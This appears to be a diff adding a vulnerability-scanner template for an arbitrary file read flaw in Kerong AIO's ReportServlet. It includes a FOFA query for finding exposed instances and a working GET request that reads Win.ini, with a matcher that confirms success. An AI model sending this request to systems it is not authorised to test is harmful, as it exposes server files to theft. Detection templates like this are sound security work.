@@ -1,0 +1,26 @@
+id: kerong-aio-arbitrary-file-read
+
+info:
+  name: "科荣AIO ReportServlet 文件读取权限控制缺陷"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="changeAccount('8000')"
+          科荣AIO---集成进销存,财务,OA,CRM,HR,电子商务一体化企业管理软件。该系统未正确实施文件访问控制机制，攻击者可通过构造特定请求读取任意文件内容。
+  tags: 科荣AIO
+
+http:
+- raw:
+  - |
+    GET /ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Connection: Keep-Alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
